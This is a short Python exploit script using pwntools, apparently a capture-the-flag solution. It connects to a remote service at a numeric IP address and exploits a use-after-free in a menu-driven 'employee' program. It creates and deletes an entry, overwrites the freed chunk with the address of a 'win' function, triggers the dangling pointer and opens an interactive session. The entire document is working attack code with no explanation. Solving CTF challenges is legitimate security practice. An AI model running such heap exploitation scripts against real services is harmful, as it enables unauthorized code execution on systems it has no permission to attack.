from pwn import *

context.binary = './chall'
elf = context.binary

p = remote('152.118.201.241', 3020)

win = elf.symbols['win']

# create employee
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Name: ', b'A')

# delete employee
p.sendlineafter(b'>> ', b'3')

# endorse (overwrite freed chunk)
payload = p64(win) + b'A'*16
p.sendlineafter(b'>> ', b'4')
p.sendlineafter(b'Endorsement: ', payload)

# trigger
p.sendlineafter(b'>> ', b'2')

p.interactive()